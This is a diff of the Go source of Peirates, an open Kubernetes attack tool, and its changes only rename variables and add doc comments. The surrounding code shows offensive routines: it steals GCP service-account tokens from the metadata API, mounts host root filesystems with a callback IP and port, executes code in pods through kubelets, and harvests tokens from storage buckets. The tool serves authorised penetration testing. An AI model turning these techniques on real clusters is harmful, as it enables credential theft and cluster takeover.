@@ -1,10 +1,11 @@
+package peirates
+
 // Peirates - an Attack tool for Kubernetes clusters
 //
 // You need to use "package main" for executables
 //
 // BTW always run `go fmt` before you check in code. go fmt is law.
 //
-package peirates
 
 import (
 	"bufio"
@@ -118,11 +119,11 @@ func GetGCPBearerTokenFromMetadataAPI(account string) string {
 	headers = []HeaderLine{
 		HeaderLine{"Metadata-Flavor", "Google"},
 	}
-	url_sa := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" + account + "/token"
+	urlSvcAccount := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" + account + "/token"
 
-	reqTokenRaw := GetRequest(url_sa, headers, false)
+	reqTokenRaw := GetRequest(urlSvcAccount, headers, false)
 	if (reqTokenRaw == "") || (strings.HasPrefix(reqTokenRaw, "ERROR:")) {
-		println("[-] Error - could not perform request ", url_sa)
+		println("[-] Error - could not perform request ", urlSvcAccount)
 		return ("ERROR")
 	}
 	// Body will look like this, unless error has occurred: {"access_token":"xxxxxxx","expires_in":2511,"token_type":"Bearer"}
@@ -275,8 +276,8 @@ func injectIntoAPodViaAPIServer(connectionString ServerInfo, pod string) {
 
 		// println("Option 2 is: ")
 		// CA path
-		ca_path := "--certificate-authority=" + connectionString.CAPath
-		args := []string{"kubectl", "--token", connectionString.Token, ca_path, "-n", connectionString.Namespace, "exec", "-it", pod, "--", "/tmp/peirates"}
+		caPath := "--certificate-authority=" + connectionString.CAPath
+		args := []string{"kubectl", "--token", connectionString.Token, caPath, "-n", connectionString.Namespace, "exec", "-it", pod, "--", "/tmp/peirates"}
 
 		path, lookErr := exec.LookPath("kubectl")
 		if lookErr != nil {
@@ -469,7 +470,6 @@ type Secret_Details struct {
 	SecretType string `json:"type"`
 }
 
-//adam here
 type Get_Node_Details struct {
 	Items []struct {
 		Metadata struct {
@@ -484,7 +484,7 @@ type Get_Node_Details struct {
 	} `json:"items"`
 }
 
-// GetPodsInfo() gets details for all pods in json output and stores in PodDetails struct
+// GetPodsInfo gets details for all pods in json output and stores in PodDetails struct
 func GetPodsInfo(connectionString ServerInfo, podDetails *PodDetails) {
 
 	if !kubectlAuthCanI(connectionString, "get", "pods") {
@@ -533,7 +533,7 @@ func PrintHostMountPointsForPod(podInfo PodDetails, pod string) {
 	}
 }
 
-// GetRoles() enumerates all roles in use on the cluster (in the default namespace).
+// GetRoles enumerates all roles in use on the cluster (in the default namespace).
 // It parses all roles into a KubeRoles object.
 func GetRoles(connectionString ServerInfo, kubeRoles *KubeRoles) {
 	println("[+] Getting all Roles")
@@ -552,7 +552,6 @@ func GetRoles(connectionString ServerInfo, kubeRoles *KubeRoles) {
 
 func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP, callbackPort string) {
 	var MountInfoVars = MountInfo{}
-	// BUG: this routine seems to create the same pod name every time, which makes it so it can't run twice.
 
 	// First, confirm we're allowed to create pods
 	if !kubectlAuthCanI(connectionString, "create", "pod") {
@@ -708,7 +707,8 @@ func clearScreen() {
 	c.Run()
 }
 
-// SERVICE ACCOUNT MANAGEMENT
+// SERVICE ACCOUNT MANAGEMENT functions start here
+
 type ServiceAccount struct {
 	Name            string    // Service account name
 	Token           string    // Service account token
@@ -804,6 +804,7 @@ ________________________________________
 
 }
 
+// ReadFile reads a file at path filename and prints it out.
 func ReadFile(filename string) {
 	data, err := ioutil.ReadFile(filename)
 	if err != nil {
@@ -812,6 +813,7 @@ func ReadFile(filename string) {
 	fmt.Printf("\nFile Content: %s", data)
 }
 
+// GetNodesInfo runs kubectl get nodes -o json.
 func GetNodesInfo(connectionString ServerInfo) {
 	println("[+] Getting details for all pods")
 	podDetailOut, _, err := runKubectlSimple(connectionString, "get", "nodes", "-o", "json")
@@ -821,6 +823,7 @@ func GetNodesInfo(connectionString ServerInfo) {
 	}
 }
 
+// ExecuteCodeOnKubelet runs a command on every pod on every node via their Kubelets.
 func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]ServiceAccount) {
 	println("[+] Getting IP addresses for the nodes in the cluster...")
 	// BUG : This auth check isn't catching when we're not allowed to get nodes at the cluster scope
@@ -854,10 +857,10 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]Servic
 					// Make a request for our service account(s)
 					var headers []HeaderLine
 
-					url_sa := "http://" + addr.Address + ":10255/pods"
-					runningPodsBody := GetRequest(url_sa, headers, false)
+					urlSvcAccount := "http://" + addr.Address + ":10255/pods"
+					runningPodsBody := GetRequest(urlSvcAccount, headers, false)
 					if (runningPodsBody == "") || (strings.HasPrefix(runningPodsBody, "ERROR:")) {
-						println("[-] Kubelet request for running pods failed - using this URL:", url_sa)
+						println("[-] Kubelet request for running pods failed - using this URL:", urlSvcAccount)
 						continue nodeLoop
 					}
 
@@ -931,6 +934,7 @@ type PodNamespaceContainerTuple struct {
 
 //------------------------------------------------------------------------------------------------------------------------------------------------
 
+// PeiratesMain starts Peirates
 func PeiratesMain() {
 
 	// Create a global variable named "connectionString" initialized to default values
@@ -1402,17 +1406,17 @@ Leave off the "kubectl" part of the command.  For example:
 				for _, line := range objectListLines {
 					if strings.Contains(line, "selfLink") {
 						if strings.Contains(line, "%2Fsecrets%2F") {
-							objectUrl := strings.Split(line, "\"")[3]
+							objectURL := strings.Split(line, "\"")[3]
 							// Find the substring that tells us this service account token's name
-							start := strings.LastIndex(objectUrl, "%2F") + 3
-							serviceAccountName := objectUrl[start:]
+							start := strings.LastIndex(objectURL, "%2F") + 3
+							serviceAccountName := objectURL[start:]
 							println("\n[+] Getting service account for:", serviceAccountName)
 
 							// Get the contents of the bucket to get the service account token
-							saTokenUrl := objectUrl + "?alt=media"
+							saTokenURL := objectURL + "?alt=media"
 
 							// We use the same headers[] from the previous GET request.
-							bodyToken := GetRequest(saTokenUrl, headers, false)
+							bodyToken := GetRequest(saTokenURL, headers, false)
 							if (bodyToken == "") || (strings.HasPrefix(bodyToken, "ERROR:")) {
 								continue eachbucket
 							}
